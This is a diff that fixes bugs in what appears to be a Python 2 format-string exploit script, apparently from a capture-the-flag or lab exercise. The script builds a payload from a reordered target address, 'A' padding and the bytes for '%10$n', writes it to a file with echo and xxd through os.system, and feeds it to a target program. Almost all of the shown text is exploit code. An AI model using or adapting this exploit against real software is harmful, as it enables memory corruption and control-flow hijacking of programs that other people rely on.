@@ -26,7 +26,7 @@ def generate_break_file(size_of_change = 0):
     print p.readline()
 
     flipped_addr = first + second + third + last
-    payload = flipped_addr + "".join['41']*size_of_change +" 25 31 30 24 6e"
+    payload = flipped_addr + "".join(['41']*size_of_change) +" 25 31 30 24 6e"
     create_hex = "echo "+ payload + " > file.hex"
     os.system(create_hex)
     convert_hex = "xxd -r -p file.hex > file"
@@ -45,12 +45,10 @@ def break_program():
     os.system(command)
 
 def main():
-    generate_break_file_(args.secret_1)
+    args = get_args()
+    generate_break_file(args.secret_1)
     break_program()
     os.system("rm file.hex file")
 
 if __name__ == "__main__":
     main()
-
-
-    args = get_args()
